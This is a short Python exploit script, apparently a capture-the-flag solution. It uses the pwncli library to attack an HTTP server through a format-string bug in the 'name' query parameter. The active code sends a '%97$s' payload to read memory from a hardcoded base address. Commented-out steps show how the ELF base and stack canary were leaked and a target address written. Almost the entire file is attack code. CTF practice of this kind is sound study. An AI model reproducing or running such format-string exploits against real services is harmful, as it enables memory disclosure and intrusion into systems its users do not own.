#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
# set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def get_payload(name):
    payload = b"GET /index.html?name=" + name
    payload += b" HTTP/1.1\n"
    payload += b"\n"
    return payload


# 跑三次，一次找基址，一次写 target，最后 %s

# payload = get_payload(b"%16$p")
# s(payload)
# ru(b"DEBUG: ")
# elf_base = int(io.recv(), 16) - 0x3272
# lg("elf_base", elf_base)

elf_base = 0x55EC502DC000

# payload = get_payload(b"a" * 7 + p64(elf_base + 0x5040) * 3)
# s(payload)
# ru(b"DEBUG: ")

payload = get_payload(b"%97$s")
s(payload)
ru(b"DEBUG: ")

ia()

"""
unused:

# canary = 0x1A8DD3A7FCD2CA00

# payload = get_payload(b"%12$p")
# s(payload)
# ru(b"DEBUG: ")
# canary = int(io.recv(), 16)
# lg("canary", canary)
"""
